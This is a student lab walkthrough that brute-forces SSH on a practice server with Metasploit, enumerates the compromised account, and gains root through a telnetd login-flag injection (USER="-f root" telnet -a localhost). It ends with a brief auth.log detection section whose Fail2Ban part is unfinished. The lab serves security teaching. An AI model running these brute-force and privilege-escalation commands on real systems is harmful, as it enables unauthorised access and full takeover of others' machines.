# SSH Brute Force Lab
This lab Takes step 2 and 3 of the cyber kill chain, Weaponization. In this lab we will be attempting to use a tool to brute force the SSH service of our target linux server with the target of bob. Based on OSINT we know this individual has been breached in the past and we can get their password likely in the rockyou database.

We will also talk preventions here since I'm very oriented to the blue team side of cybersecurity, and this is a great time to talk ratelimiting

---
## Required Materials
- Setup lab lab completed
- Recon completed

---
1. Login and access the kali linux machine username/password: `kali:kali`

2. Prepare the wordlist
To ensure this lab goes quicky. I have prepared a wordlist already that is located in this github with title "passlist" use this by copying it over to your kali workstation. We will use this to brute force as its a more targeted wordlist. There are multiple ways you can copy this over. If you have host only networking you might need to enable another network adapter (Through the settings of the VM) with a "NAT" so it will be able to access the internet
```sh
wget https://tinyurl.com/w7-passlist # Copies down the file, you can also download manually if required.
```

We are going to create the directory and track our items in a new directory to help with logging.
```sh
mkdir -p ~/labs/ssh-brute
mv ./w7-passlist ~/labs/ssh-brute
cd ~/labs/ssh-brute
# We will use this in case we wish to log any parts of our attack.
```

3. See the help menu for metasploit console
Metaspolit is a very common tool with easy explots that allow you to attack a target. We will be using it's ability to brute force 

```sh
msfconsole
search ssh_login
use auxiliary/scanner/ssh/ssh_login # OR `use 0`
show options
set RHOST <Target IP>
set PASS_FILE ~/labs/ssh-brute/w7-passlist
set USERNAME bob

# Ensure options are set
show options
# Run a check
check 
```
Congrats! You are now done with the "Weaponization" chain of the cyber kill chain, as you can see you went and started getting your tools together prior to running. Lets Execute our attack!

```sh
# Executing the attack
exploit
```
Take note here of the output. You will see the IP target, with success. then the username:password combo. along with info about the server through some basic recon commands. 

[Screenshot here]()

If you recieved the password of the bob account, lets try to login with the account!

```sh
sessions -l # Youll see that you have one open! Lets open this session
sessions -i 1 # Open the session and you will find yourself in a menu
```
Metasploit helps you get a really easy shell that you can use with their commands, however its not as intuitive as shells you might know. To help this, lets drop to a shell session and ask metasploit to get us more access.

```sh
help
shell
```

Now we have access to the operating system!

4. Exploring our access
As an attacker, now that we have access to a system we will need to explore and learn our environment.

```sh
sudo -l # do we have root perms? (look at the metasploit output from be
uname -a # vulnerable kernel?
ps -aux # Services?
history # Any command history?
crontab -l # Scheduled jobs?
```

Telnet is running. Hm whats the version?
```sh
telnet -V # This is the CLIENT
telnetd -V # This is for the server. Compiled in 2023... This could be vulnerable!
```

6. Privilege Escalation special
As you might have observed in recon, the telnet version 2.5 `telnet -V` is actually vulnerable to a new exploit [CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061). This exploit allows for, well trivial privilege escalation.

Telnet is the first version of SSH. It was developed several years ago prior to the infrastucture of public keys we have today. Meaning the traffic that is sent to and from the web server is actually able to be sniffed and located by an attacker. Some servers still use it however, and this is why this vulnerability is so extreme.


BEFORE MOVING ON LOOK AT ABOVE. GOOGLE AND LEARN HOW TO FIND CVE's!!


While logged in as bob type:
```sh
USER="-f root" telnet -a localhost
```
This is practically the equivilent of walking into a bank saying "Hey I work here, just give me all the money" and walking out with the entire bank vault. You instantly are dropped into the most privileged account on the system.

This attack works due to how the /usr/bin/login binary works, it allows programs that call it to pass parameters to it and even bypass a password. Since they didn't sanitize the input of the USER variable, we can use this to our advantage by just saying "Hey I am root just let me in please"

Here's the help menu for /usr/bin/login
```sh
/usr/bin/login -h
```

**Ending note - Finding the SSH Brute force**
If you want to see this from a blue team perspective. I recomend looking here:
```sh
# /var/log/auth.log shows authentication attempts for a user. use these commands to help look around:
less /var/log/auth.log | grep sshd
cat /var/log/auth.log | grep Accepted
cat /var/log/auth.log | grep Failed
```
There are programs that help with brute force protection, Fail2Ban being one of them. 
```sh
# Will be completed instructions later 1/30/26 here.
```

You will see anything from SSH, to telnet, to any kind of login open on a system. This will help in an incident response in trying to figure out what happend to a system. We will talk further about IR later in our project.

---
## Conclusion
You have succesfully run an attack on a system, brute forcing your way in.
